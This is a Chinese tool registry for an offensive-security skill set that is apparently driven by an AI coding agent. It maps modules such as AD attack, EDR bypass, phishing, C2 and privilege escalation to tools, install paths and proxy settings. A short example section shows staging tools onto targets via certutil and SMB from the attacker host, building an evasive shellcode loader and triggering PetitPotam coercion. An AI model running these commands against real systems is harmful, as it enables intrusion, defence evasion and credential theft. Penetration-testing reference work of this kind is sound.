# 工具注册表

所有 skill 共享。本文件 **不是攻击模块**：只登记安装、路径、归属。真正怎么打在各模块 `SKILL.md` / `references/`。

- CVE / KEV / EPSS / PoC 查询 → `cve-enrichment.md`（先指纹）。不要对 banner 无脑 `web_search ... CVE`。
- 表里没有的工具：`web_search "<工具名> site:github.com"`。
- 表里有、但模块边界写了「不在这里做」：不要因为工具在本文件就跨模块开打。

### 模块归属（防抢活）

| 模块 | 典型工具 |
|---|---|
| `/recon` | nmap, naabu, vulnx, subfinder, httpx, uncover |
| `/web-recon` | ffuf, katana, nuclei, kiterunner, waybackurls, gau |
| `/web-attack` | sqlmap, ghauri, phpggc, ysoserial, plormber, interactsh |
| `/service-attack` | nxc, redis-cli, sqlcmd, sqlplus, mongosh, smbclient |
| `/ad-recon` | nxc, bloodyAD, certipy find, BloodHound, SOAPHound |
| `/ad-attack` | nxc, certipy, Rubeus, Coercer, impacket, pywhisker |
| `/cloud-recon` | aws/az/gcloud/aliyun, pmapper, ROADtools, AzureHound |
| `/cloud-attack` | aws/az/gcloud/aliyun, Pacu（改策略前 snapshot） |
| `/k8s` | kubectl, kubeletctl, KubeHound, peirates, badPods |
| `/cicd` | Trajan, Poutine, gitleaks, jenkins-decryptor |
| `/creds` | hashcat, Responder, DonPAPI, Titus, nanodump |
| `/privesc-win` | GodPotato, SigmaPotato, LocalPotato, PrivescCheck |
| `/privesc-linux` | linPEAS, pspy, chwoot PoC, Copy Fail 主机 PoC |
| `/post` | Sliver, Mythic |
| `/shell` | rlwrap, ConPtyShell, socat |
| `/tunnel` | ligolo-ng, chisel, GOST v3, devtunnel |
| `/edr-bypass` | SysWhispers4, Donut, EDR-Freeze |
| `/phishing` | Evilginx, TokenTacticsV2, roadtx |

Coercion（PetitPotam/Coercer）= `/ad-attack`。nanodump 提取 = `/creds`；被 PPL 杀 = `/edr-bypass` 后回 `/creds`。  
ConPtyShell 日常会话升级 = `/shell`；钓鱼落地后的 callback 仍属 `/phishing`。  
Copy Fail **主机** PoC = `/privesc-linux`；**K8s DaemonSet** PoC = `/k8s`。

---

## 扫描与侦察

| 工具 | 安装 | 说明 |
|---|---|---|
| nmap | Kali预装 | TCP/UDP扫描+NSE脚本 |
| rustscan | `apt install rustscan` | 全端口秒扫→自动调nmap |
| AutoRecon | `pipx install autorecon` | 一键全套枚举 |
| masscan | Kali预装 | 大规模快速端口扫描 |
| Shodan | `pipx install shodan` | 互联网设备搜索引擎 |
| theHarvester | Kali预装 | 邮箱/子域名/员工姓名收集 |
| searchsploit | Kali预装 (`exploitdb`) | 本地漏洞/exploit搜索 |
| vulnx | `go install github.com/projectdiscovery/vulnx/v2/cmd/vulnx@latest` | 漏洞数据探索（KEV/EPSS/PoC/template）；cvemap 的现代替代/互补 |
| cvemap | `go install github.com/projectdiscovery/cvemap/cmd/cvemap@latest` | CPE/产品 CVE 富化（部分环境仍用） |
| osv-scanner | `go install github.com/google/osv-scanner/v2/cmd/osv-scanner@latest` | lockfile/依赖漏洞（OSV） |
| onesixtyone | Kali预装 | SNMP社区字符串爆破 |
| redis-cli | `apt install redis-tools` | Redis客户端（直连走 `/service-attack`） |
| trufflehog | `pipx install trufflehog` | Git/文件系统密钥扫描 |
| gitleaks | `apt install gitleaks` | Git 密钥扫描（CI/盘也用） |
| Titus | github.com/praetorian-inc/titus | 2026 密钥扫描（替代 Nosey Parker）；`/creds` 优先 |
| subfinder | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` | 被动子域名发现 |
| dnsx | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` | DNS解析/验证/爆破 |
| naabu | `go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest` | 快速端口扫描 |
| uncover | `go install github.com/projectdiscovery/uncover/cmd/uncover@latest` | 搜索引擎API聚合(Shodan/Censys/Fofa) |
| ssh-audit | `pipx install ssh-audit` | SSH算法/密钥/版本安全审计 |

## Web

| 工具 | 安装 | 说明 |
|---|---|---|
| ffuf | Kali预装 | 路径/参数/vhost fuzz |
| feroxbuster | Kali预装 | 自动递归路径枚举 |
| gobuster | Kali预装 | 路径/DNS/vhost枚举 |
| dirsearch | Kali预装 | 路径枚举 |
| nuclei | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` | 模板匹配已知CVE |
| Arjun | `pipx install arjun` | 隐藏参数发现 |
| sqlmap | Kali预装 | SQL注入自动化 |
| SSTImap | `pipx install sstimap` | SSTI自动检测+利用 |
| whatweb | Kali预装 | 技术指纹识别 |
| wpscan | Kali预装 | WordPress专项扫描 |
| jwt_tool | `pipx install jwt-tool` 或 github.com/ticarpi/jwt_tool | JWT攻击全套 |
| NoSQLMap | github.com/codingo/NoSQLMap | NoSQL注入自动化 |
| phpggc | github.com/ambionics/phpggc | PHP反序列化gadget链生成 |
| ysoserial | github.com/frohoff/ysoserial | Java反序列化gadget链生成 |
| gopherus | github.com/tarunkant/Gopherus | SSRF gopher协议payload生成 |
| interactsh | `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` | OOB交互确认 |
| git-dumper | `pipx install git-dumper` | .git目录泄露下载还原 |
| httpx | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` | HTTP批量探测/指纹/技术栈 |
| katana | `go install github.com/projectdiscovery/katana/cmd/katana@latest` | 爬虫，抓JS/API端点 |
| wafw00f | Kali预装 | WAF厂商识别 |
| ghauri | `pipx install ghauri` | SQLi自动化(对加固目标比sqlmap更强) |
| kiterunner | github.com/assetnote/kiterunner | API 路由/方法发现（`/web-recon`） |
| waybackurls | `go install github.com/tomnomnom/waybackurls@latest` | 历史 URL（`/web-recon`） |
| gau | `go install github.com/lc/gau/v2/cmd/gau@latest` | 历史 URL 聚合 |
| plormber | github.com/elttam/plormber | time-based ORM leak（`/web-attack`） |
| smuggler | github.com/defparam/smuggler | HTTP request smuggling |
| Rogue-MySql-Server | github.com/allyshka/Rogue-MySql-Server | 假 MySQL（`/web-attack` SSRF/客户端滥用） |

## 服务客户端（`/service-attack`；直连库不是 Web）

| 工具 | 安装 | 说明 |
|---|---|---|
| redis-cli | `apt install redis-tools` | Redis |
| mysql | Kali预装 (`default-mysql-client`) | MySQL |
| psql | Kali预装 (`postgresql-client`) | PostgreSQL |
| mongosh | `apt install mongosh` | MongoDB |
| sqlcmd | `apt install mssql-tools18` 或目标自带 | MSSQL |
| sqlplus | Oracle Instant Client | Oracle |

## 域/AD

| 工具 | 安装 | 说明 |
|---|---|---|
| BloodHound CE | `curl -L https://ghst.ly/getbhce \| docker compose -f - up` | AD攻击路径可视化 |
| SharpHound | BloodHound附带 / github.com/BloodHoundAD/SharpHound | BH采集器(.NET) |
| bloodhound-python | `pipx install bloodhound` | BH采集器(Python,Kali远程) |
| bloodyAD | `pipx install bloodyAD` | AD枚举+提权瑞士军刀(LDAP+SAMR,从Kali执行) |
| ldapdomaindump | `pipx install ldapdomaindump` | LDAP全量dump为HTML/JSON |
| ldapsearch | Kali预装 (`ldap-utils`) | 原生LDAP查询 |
| rpcclient | Kali预装 (`samba-common-bin`) | RPC匿名/认证枚举 |
| adidnsdump | `pipx install adidnsdump` | AD DNS记录dump |
| ADExplorerSnapshot.py | github.com/c3c/ADExplorerSnapshot.py | 解析ADExplorer快照为BloodHound JSON |
| RustHound-CE | github.com/NH-RED-TEAM/RustHound-CE | BH采集器(Rust,最快最静) |
| Rubeus | github.com/GhostPack/Rubeus | Kerberos攻击(.NET) |
| impacket | Kali预装 (`impacket-*`) | AD/SMB/Kerberos全套Python工具 |
| kerbrute | github.com/ropnop/kerbrute | Kerberos用户名枚举/密码喷洒 |
| PowerView | github.com/PowerShellMafia/PowerSploit (Recon/) | AD枚举PS模块 |
| enum4linux-ng | Kali预装 | SMB/RPC/LDAP枚举 |
| smbclient | Kali预装 | SMB共享连接/文件传输 |
| certipy | `pipx install certipy-ad` | ADCS证书攻击(Python,推荐) |
| Certify | github.com/GhostPack/Certify | ADCS证书攻击(.NET) |
| nxc (NetExec) | Kali预装 | 多协议认证+枚举+执行 |
| pywhisker | github.com/ShutdownRepo/pywhisker | Shadow Credentials攻击 |
| SOAPHound | github.com/FalconForceTeam/SOAPHound | ADWS协议隐蔽枚举 |
| StandIn | github.com/FuzzySecurity/StandIn | AD 枚举/.NET（传到 Windows） |

## 云

| 工具 | 安装 | 说明 |
|---|---|---|
| aws-cli | `apt install awscli` | AWS官方CLI |
| az-cli | 微软官方安装脚本 | Azure官方CLI |
| Pacu | `apt install pacu` | AWS渗透框架 |
| enumerate-iam | github.com/andresriancho/enumerate-iam | AWS IAM权限枚举 |
| ScoutSuite | `pipx install scoutsuite` | 多云安全审计 |
| cloud-enum | `apt install cloud-enum` | 云存储桶/资源发现 |
| ROADtools | `pipx install roadrecon` | Azure/Entra ID枚举+可视化 |
| AzureHound | github.com/BloodHoundAD/AzureHound | Azure攻击路径→BloodHound |
| AADInternals | `Install-Module AADInternals` (PowerShell) | Azure AD内部工具 |
| GraphRunner | github.com/dafthack/GraphRunner | Microsoft Graph API攻击(PS) |
| MFASweep | github.com/dafthack/MFASweep | Azure MFA端点探测(PS) |
| MSOLSpray | github.com/dafthack/MSOLSpray | Azure密码喷洒(PS) |
| gcloud | `apt install google-cloud-sdk` | GCP官方CLI |
| gsutil | gcloud SDK附带 | GCP Storage Bucket操作 |
| aliyun-cli | github.com/aliyun/aliyun-cli | 阿里云官方CLI |
| PMapper | `pipx install principalmapper` | AWS IAM 攻击图（`/cloud-recon`） |
| Cloudsplaining | `pipx install cloudsplaining` | AWS 策略扫描（recon，不改策略） |

## Kubernetes / 容器

| 工具 | 安装 | 说明 |
|---|---|---|
| kubectl | `apt install kubectl` 或 Snap | K8s官方CLI |
| peirates | github.com/inguardians/peirates | K8s Pod内自动化渗透框架 |
| kube-hunter | `pipx install kube-hunter` | K8s集群漏洞扫描 |
| kubeletctl | github.com/cyberark/kubeletctl | 直接操作kubelet API |
| KubeHound | github.com/DataDog/KubeHound | K8s 攻击路径图 |
| CDK | github.com/cdk-team/CDK | 容器渗透工具包(信息收集+逃逸) |
| etcdctl | 随etcd发行版 | etcd数据库CLI |
| docker | Kali预装 | Docker客户端(用于Docker socket逃逸) |
| crictl | github.com/kubernetes-sigs/cri-tools | CRI容器运行时CLI |
| badPods | github.com/BishopFox/badPods | 危险 Pod spec 模板（`/k8s`） |
| Copy Fail K8s PoC | github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC | 跨工作负载；主机 PoC 不在这 |

## CI/CD

| 工具 | 安装 | 说明 |
|---|---|---|
| jenkins-credentials-decryptor | github.com/hoto/jenkins-credentials-decryptor | Jenkins凭据解密 |
| gitleaks | `apt install gitleaks` | Git仓库密钥泄露扫描 |
| clairvoyance | github.com/nikitastupin/clairvoyance | GraphQL schema猜测(内省被禁时) |
| twine | `pipx install twine` | PyPI包发布(依赖混淆用) |
| Trajan | github.com/praetorian-inc/trajan | Gato/Glato 继任；GitHub/GitLab/ADO 检测+授权验证 |
| Poutine | github.com/boostsecurityio/poutine | 跨平台 CI workflow 静态审计 |
| Octoscan | github.com/synacktiv/octoscan | GitHub Actions 攻击面扫描 |
| zizmor | github.com/zizmorcore/zizmor | GitHub Actions 高精度审计 |

## EDR规避

| 工具 | 安装 | 说明 |
|---|---|---|
| SysWhispers4 | github.com/JoasASantos/SysWhispers4 | 现代 syscall stub（优先于 SW3） |
| SysWhispers3 | github.com/klezVirus/SysWhispers3 | 旧 syscall stub，兼容旧笔记 |
| HellsGate | github.com/am0nsec/HellsGate | 运行时间接syscall |
| TartarusGate | github.com/trickster0/TartarusGate | 间接syscall（hooked ntdll） |
| RecycledGate | github.com/thefLink/RecycledGate | 间接syscall |
| Ekko | github.com/Cracked5pider/Ekko | Sleep加密 |
| Foliage | github.com/SecIdiot/Foliage | Sleep加密（APC） |
| ThreadStackSpoofer | github.com/mgeeky/ThreadStackSpoofer | 调用栈欺骗 |
| Caro-Kann | github.com/S3cur3Th1sSh1t/Caro-Kann | 内存扫描时序研究 |
| EDR-Freeze | github.com/TwoSevenOneT/EDR-Freeze | 用户态挂起 EDR/Defender（WerFaultSecure） |
| Donut | github.com/TheWover/donut | PE/.NET → shellcode |
| nanodump | github.com/fortra/nanodump | 绕部分 EDR dump LSASS |

## 认证强制（Coercion）— 属于 /ad-attack，不是 EDR

| 工具 | 安装 | 说明 |
|---|---|---|
| PetitPotam | github.com/topotam/PetitPotam | MS-EFSRPC |
| DFSCoerce | github.com/Wh04m1001/DFSCoerce | MS-DFSNM |
| ShadowCoerce | github.com/ShutdownRepo/ShadowCoerce | MS-FSRVP |
| SpoolSample | github.com/leechristensen/SpoolSample | PrinterBug |
| Coercer | `pipx install coercer` | 统一扫描/触发 coercion 接口 |

## 提权

| 工具 | 安装 | 说明 |
|---|---|---|
| winPEAS | github.com/peass-ng/PEASS-ng | Windows提权枚举(一站式) |
| linPEAS | github.com/peass-ng/PEASS-ng | Linux提权枚举(一站式) |
| SharpUp | github.com/GhostPack/SharpUp | Windows提权枚举(.NET) |
| PrivescCheck | github.com/itm4n/PrivescCheck | Windows提权枚举(PS) |
| PowerUp | PowerSploit内置 | Windows提权经典PS脚本 |
| Seatbelt | github.com/GhostPack/Seatbelt | Windows安全审计(.NET) |
| accesschk | Sysinternals | Windows服务/注册表权限检查 |
| WES-NG | github.com/bitsadmin/wesng | Windows内核漏洞匹配 |
| linux-exploit-suggester | github.com/The-Z-Labs/linux-exploit-suggester | Linux内核漏洞匹配 |
| pspy | github.com/DominicBreuker/pspy | Linux无root监控进程/cron |
| Priv2Admin | github.com/gtworek/Priv2Admin | Windows特权→SYSTEM对照表 |
| KrbRelayUp | github.com/Dec0ne/KrbRelayUp | 域内本机用户→本机管理员 |
| SeManageVolumeExploit | github.com/CsEnox/SeManageVolumeExploit | SeManageVolume→C:\ 可写 |
| chwoot | github.com/pr0v3rbs/CVE-2025-32463_chwoot | sudo 1.9.14–1.9.17 LPE（`/privesc-linux`） |
| Copy Fail 主机 PoC | github.com/theori-io/copy-fail-CVE-2026-31431 | CVE-2026-31431 本机；K8s 配方在 `/k8s` |
| CVE-2024-1086 | github.com/Notselwyn/CVE-2024-1086 | nf_tables LPE（版本门） |
| CVE-2025-6019 | github.com/guinea-offensive-security/CVE-2025-6019 | polkit/udisks（以仓库为准） |
| PrintNightmare | github.com/cube0x0/CVE-2021-1675 | **本地**打印驱动 LPE；远程打 DA 不在 `/privesc-win` |

## Potato系列（SeImpersonate→SYSTEM）

| 工具 | 适用系统 | 安装 |
|---|---|---|
| GodPotato（首选） | Server 2012-2022 / Win8-11 | github.com/BeichenDream/GodPotato |
| SigmaPotato | Win10+/Server 2016+；GodPotato 失败/24H2 | github.com/tylerdotrar/SigmaPotato |
| PrintSpoofer | Win10/Server 2016-2019，需 Spooler | github.com/itm4n/PrintSpoofer |
| JuicyPotatoNG | Server 2012-2022（不要用原 Juicy） | github.com/antonioCoco/JuicyPotatoNG |
| SweetPotato | Server 2008-2019 | github.com/CCob/SweetPotato |
| EfsPotato | Win10+/Server 2016+ | github.com/zcgonvh/EfsPotato |
| DCOMPotato | Server 2016-2022 | github.com/zcgonvh/DCOMPotato |
| RogueWinRM | WinRM 已启动 | github.com/antonioCoco/RogueWinRM |
| LocalPotato | **不需要** SeImpersonate；CVE-2023-21746 未补 | github.com/decoder-it/LocalPotato |

## 密码与凭据

| 工具 | 安装 | 说明 |
|---|---|---|
| hashcat | Kali预装 | GPU离线破解 |
| john | Kali预装 | CPU离线破解+格式转换 |
| hydra | Kali预装 | 在线多协议爆破 |
| hashid | Kali预装 | Hash类型识别 |
| Responder | Kali预装 | LLMNR/NBT-NS毒化抓hash |
| DonPAPI | `pipx install donpapi` | DPAPI凭据批量收割 |
| dploot | `pipx install dploot` | DPAPI凭据提取 |
| LaZagne | github.com/AlessandroZ/LaZagne | 本地凭据提取 |
| CeWL | Kali预装 | 从网站爬关键词做字典 |
| username-anarchy | github.com/urbanadventurer/username-anarchy | 姓名→用户名格式生成 |
| pypykatz | `pipx install pypykatz` | Kali端离线解析lsass dump |
| nanodump | github.com/fortra/nanodump | 绕EDR dump lsass |
| TREVORspray | `pipx install git+https://github.com/blacklanternsecurity/trevorspray` | M365密码喷洒(SSH代理轮换) |
| TeamFiltration | github.com/Flangvik/TeamFiltration/releases | O365一站式(枚举/喷洒/提取)，预编译二进制 |
| o365spray | `pipx install git+https://github.com/0xZDH/o365spray` | O365用户名枚举+密码喷洒 |
| Spray365 | github.com/MarkoH17/Spray365 | M365喷洒(按当前 smart lockout，不写死间隔) |
| Chrome ABE | github.com/xaitax/Chrome-App-Bound-Encryption-Decryption | Chrome 127+ App-Bound cookie/密码；常需 SYSTEM |

## C2（`/post`）与 payload 打包

Freeze / ScareCrow / Donut 的 **落地与拦截** 走 `/edr-bypass`，不在 `/post` 里当免杀教程。

| 工具 | 安装 | 说明 |
|---|---|---|
| Sliver | `curl https://sliver.sh/install \| sudo bash` | 开源C2（`/post` P0） |
| Mythic | github.com/its-a-feature/Mythic | 模块化 C2（`/post` P1） |
| Havoc | github.com/HavocFramework/Havoc | 开源C2；编译前确认仓库仍维护 |
| Adaptix | 点名即可 | 2025–2026 开源 C2；不编 CLI |
| msfvenom | Kali预装 (Metasploit) | Payload生成 |
| msfconsole | Kali预装 | Metasploit框架+handler |
| Freeze | github.com/Optiv/Freeze | Shellcode免杀打包 |
| ScareCrow | github.com/optiv/ScareCrow | Shellcode免杀打包(签名伪装) |
| Donut | github.com/TheWover/donut | exe/dll/.NET转shellcode |

## 隧道与代理

| 工具 | 安装 | 说明 |
|---|---|---|
| chisel | github.com/jpillora/chisel | HTTP封装TCP隧道/SOCKS |
| ligolo-ng | github.com/nicocha30/ligolo-ng | TUN隧道（`/tunnel` P0） |
| GOST v3 | github.com/go-gost/gost | 多传输转发/QUIC/WS（`/tunnel`） |
| Microsoft Dev Tunnels | 官方 `devtunnel` CLI | localhost 暴露；`/tunnel` 可达性，不是 C2 |
| proxychains | Kali预装 | SOCKS代理链 |
| plink | PuTTY附带 | Windows SSH隧道 |
| dnscat2 | github.com/iagox86/dnscat2 | DNS隧道 |
| sshuttle | `apt install sshuttle` | SSH转VPN |
| socat | Kali预装 | 端口转发/加密隧道 |

## 钓鱼

| 工具 | 安装 | 说明 |
|---|---|---|
| Evilginx | github.com/kgretzky/evilginx2 | AiTM 钓鱼框架 |
| TokenTacticsV2 | github.com/f-bader/TokenTacticsV2 | Device code / token refresh（红队） |
| ROADtools / roadtx | `pipx install roadlib` / github.com/dirkjanm/ROADtools | Entra device code / token |
| GraphRunner | github.com/dafthack/GraphRunner | Graph API 攻击（拿到 token 之后） |
| swaks | Kali预装 | SMTP邮件发送 |
| exiftool | Kali预装 | 文件元数据提取 |
| ConPtyShell | github.com/antonioCoco/ConPtyShell | Windows全交互shell |
| BITB | github.com/mrd0x/BITB | 伪造SSO弹窗 |
| qrencode | `apt install qrencode` | QR码生成 |

## Shell / 会话（`/shell`）

| 工具 | 安装 | 说明 |
|---|---|---|
| rlwrap | Kali预装 | 给 nc 加历史/行编辑；监听由你开 |
| socat | Kali预装 | PTY / 转发 |
| ConPtyShell | github.com/antonioCoco/ConPtyShell | Windows ConPTY 升级 |
| python3 | Kali预装 | `pty.spawn` 稳定 Linux TTY |

---

## 常用路径

```
SecLists:        /usr/share/seclists/
rockyou:         /usr/share/wordlists/rockyou.txt
webshells:       /usr/share/webshells/
nmap scripts:    /usr/share/nmap/scripts/
wordlists:       /usr/share/wordlists/
dirfuzzing:      /usr/share/seclists/Discovery/Web-Content/
usernames:       /usr/share/seclists/Usernames/
PowerSploit:     /usr/share/windows-resources/powersploit/
PowerUp.ps1:     /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
PowerView.ps1:   /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
plink.exe:       /usr/share/windows-resources/binaries/plink.exe
nc.exe:          /usr/share/windows-resources/binaries/nc.exe
winPEAS:         /usr/share/peass/winpeas/winPEASx64.exe
linPEAS:         /usr/share/peass/linpeas/linpeas.sh
```

---

## 本地工具路径映射（~/tools/）

非Kali预装的工具统一放在 `~/tools/` 下，按分类存放。Claude Code执行时从此路径取用。
Kali预装工具（nmap/ffuf/sqlmap/hashcat等）已在PATH中，无需映射。
pip/go install的工具装完也在PATH中，无需映射。
本表只覆盖需要手动下载的二进制/脚本/项目。

### ~/tools/recon/ — 扫描与侦察

```
~/tools/recon/rustscan               # 若apt版本过旧，放GitHub release
```

### ~/tools/web/ — Web漏洞利用

```
~/tools/web/NoSQLMap/                # git clone
~/tools/web/phpggc/                  # git clone
~/tools/web/ysoserial.jar            # Java jar
~/tools/web/gopherus/                # git clone
~/tools/web/jwt_tool/                # git clone（pip装不了时）
~/tools/web/plormber/                # git clone；ORM leak
~/tools/web/kiterunner               # Linux 二进制
~/tools/web/smuggler/                # git clone
~/tools/web/Rogue-MySql-Server/      # git clone
```

### ~/tools/ad/ — 域/AD（Kali端 Python/Linux）

```
~/tools/ad/PetitPotam/PetitPotam.py
~/tools/ad/kerbrute                  # /ad-recon 用户枚举
~/tools/ad/pywhisker/                # git clone
~/tools/ad/SOAPHound/                # git clone
~/tools/ad/RustHound-CE/rusthound    # Linux二进制
~/tools/ad/enumerate-iam/            # git clone（云，历史路径）
~/tools/ad/DFSCoerce/dfscoerce.py
~/tools/ad/ShadowCoerce/shadowcoerce.py
~/tools/ad/SpoolSample/printerbug.py # impacket 版 PrinterBug
~/tools/ad/Coercer/                  # 若未 pipx
~/tools/ad/ADExplorerSnapshot.py     # git clone
```

### ~/tools/ad-windows/ — 域/AD（传到Windows目标的.NET/exe）

```
~/tools/ad-windows/SharpHound.exe
~/tools/ad-windows/Rubeus.exe
~/tools/ad-windows/Certify.exe
~/tools/ad-windows/StandIn.exe
~/tools/ad-windows/Seatbelt.exe
~/tools/ad-windows/SharpUp.exe
```

### ~/tools/cloud/ — 云

```
~/tools/cloud/AzureHound/azurehound              # Linux二进制
~/tools/cloud/GraphRunner/GraphRunner.ps1         # PS脚本
~/tools/cloud/MFASweep/MFASweep.ps1
~/tools/cloud/MSOLSpray/MSOLSpray.ps1
~/tools/cloud/Pacu/                               # 若apt版本过旧
```

### ~/tools/privesc/ — 提权

```
~/tools/privesc/winPEASx64.exe
~/tools/privesc/linpeas.sh
~/tools/privesc/SharpUp.exe                       # 和ad-windows重复时symlink
~/tools/privesc/PrivescCheck.ps1
~/tools/privesc/accesschk.exe                     # Sysinternals
~/tools/privesc/pspy64                            # Linux二进制
~/tools/privesc/linux-exploit-suggester.sh
~/tools/privesc/wes.py                            # WES-NG
~/tools/privesc/KrbRelayUp.exe
~/tools/privesc/SeManageVolumeExploit.exe
~/tools/privesc/chwoot/                           # CVE-2025-32463
~/tools/privesc/copy-fail/                        # CVE-2026-31431 主机 PoC
~/tools/privesc/CVE-2024-1086/                    # nf_tables
~/tools/privesc/CVE-2025-6019/                    # polkit/udisks
```

### ~/tools/potato/ — Potato系列（传到Windows目标）

```
~/tools/potato/GodPotato.exe
~/tools/potato/PrintSpoofer.exe
~/tools/potato/JuicyPotatoNG.exe
~/tools/potato/SweetPotato.exe
~/tools/potato/SigmaPotato.exe
~/tools/potato/EfsPotato.exe
~/tools/potato/DCOMPotato.exe
~/tools/potato/RogueWinRM.exe
~/tools/potato/LocalPotato.exe
```

### ~/tools/creds/ — 密码与凭据

```
~/tools/creds/LaZagne.exe                         # Windows版
~/tools/creds/nanodump.exe                        # 传到Windows目标
~/tools/creds/username-anarchy/                   # git clone
~/tools/creds/titus                               # 若未进 PATH
~/tools/creds/Chrome-ABE/                         # ABE 解密工具源码/release
```

### ~/tools/c2/ — C2（`/post`；免杀 loader 属于 `/edr-bypass`）

```
~/tools/c2/Havoc/                                 # git clone + build（先确认维护）
~/tools/c2/Mythic/                                # 按官方 docker/install
```

### ~/tools/tunnel/ — 隧道（`/tunnel`）

```
~/tools/tunnel/chisel                             # Linux版
~/tools/tunnel/chisel.exe                         # Windows版
~/tools/tunnel/ligolo-proxy                       # Kali端
~/tools/tunnel/ligolo-agent                       # Linux目标端
~/tools/tunnel/ligolo-agent.exe                   # Windows目标端
~/tools/tunnel/gost                               # GOST v3
~/tools/tunnel/dnscat2/                           # git clone；fallback transport
~/tools/tunnel/devtunnel                          # Microsoft Dev Tunnels CLI
```

### ~/tools/k8s/ — Kubernetes/容器

```
~/tools/k8s/peirates                              # Linux二进制
~/tools/k8s/kubeletctl                            # Linux二进制
~/tools/k8s/CDK/cdk                               # Linux二进制(传入容器)
~/tools/k8s/etcdctl                               # Linux二进制
~/tools/k8s/badPods/                              # git clone
~/tools/k8s/copy-fail-k8s/                        # K8s 跨工作负载 PoC
~/tools/k8s/kubehound                             # 二进制
```

### ~/tools/cicd/ — CI/CD

```
~/tools/cicd/jenkins-credentials-decryptor/        # git clone
~/tools/cicd/clairvoyance/                         # git clone（GraphQL枚举）
~/tools/cicd/trajan                                # 二进制
~/tools/cicd/poutine
~/tools/cicd/octoscan
~/tools/cicd/zizmor
```

### ~/tools/edr/ — EDR 规避（`/edr-bypass`；没有 coercion）

```
~/tools/edr/SysWhispers4/                          # 优先
~/tools/edr/SysWhispers3/                          # 旧笔记兼容
~/tools/edr/HellsGate/
~/tools/edr/TartarusGate/
~/tools/edr/RecycledGate/
~/tools/edr/Ekko/
~/tools/edr/Foliage/
~/tools/edr/ThreadStackSpoofer/
~/tools/edr/Donut/donut
~/tools/edr/Freeze/Freeze
~/tools/edr/ScareCrow/ScareCrow
~/tools/edr/EDR-Freeze/
~/tools/edr/Caro-Kann/                            # memory-scan 研究，不是默认注入
```

### ~/tools/phishing/ — 钓鱼

```
~/tools/phishing/Evilginx/                        # git clone + make
~/tools/phishing/TokenTacticsV2/                  # git clone
~/tools/phishing/BITB/                            # git clone
```

### ~/tools/shell/ — 会话（`/shell`）

```
~/tools/shell/Invoke-ConPtyShell.ps1
```

### 用法示例（Claude Code执行）

```bash
# 传工具到目标（HTTP）
cd ~/tools/potato && python3 -m http.server 80
# 目标: certutil -urlcache -f http://KALI/GodPotato.exe C:\Users\Public\GodPotato.exe

# 传工具到目标（SMB）
impacket-smbserver share ~/tools/potato -smb2support -user a -password a
# 目标: copy \\KALI\share\GodPotato.exe C:\Users\Public\

# Kali本地执行
~/tools/edr/Freeze/Freeze -I sc.bin -encrypt -O loader.exe
~/tools/tunnel/ligolo-proxy -selfcert -laddr 0.0.0.0:11601
python3 ~/tools/ad/PetitPotam/PetitPotam.py <listener> <DC>   # /ad-attack，不是 EDR
```

---

## 代理使用（通过SOCKS隧道操作内网时）

notes.md中记录了SOCKS代理时，优先使用工具原生代理参数：

```
nxc:      --proxy socks5://127.0.0.1:1080
impacket: -proxy socks5:127.0.0.1:1080
ffuf:     -x socks5://127.0.0.1:1080
gobuster: --proxy socks5://127.0.0.1:1080
sqlmap:   --proxy socks5://127.0.0.1:1080
nuclei:   -proxy socks5://127.0.0.1:1080
curl:     --socks5 127.0.0.1:1080
```

proxychains包裹的限制：
- ❌ UDP工具无法使用（SNMP/IPMI/DNS-UDP均失败且无报错）
- ❌ nmap只能 -sT -Pn（无SYN扫描、无ping、无UDP扫描）
- ⚠️ 多线程工具可能不稳定

需要UDP → 用ligolo-ng（TUN接口，全协议，无需代理配置）

notes.md中记录ligolo-ng TUN隧道时 → 所有工具直接使用，无需加代理参数。
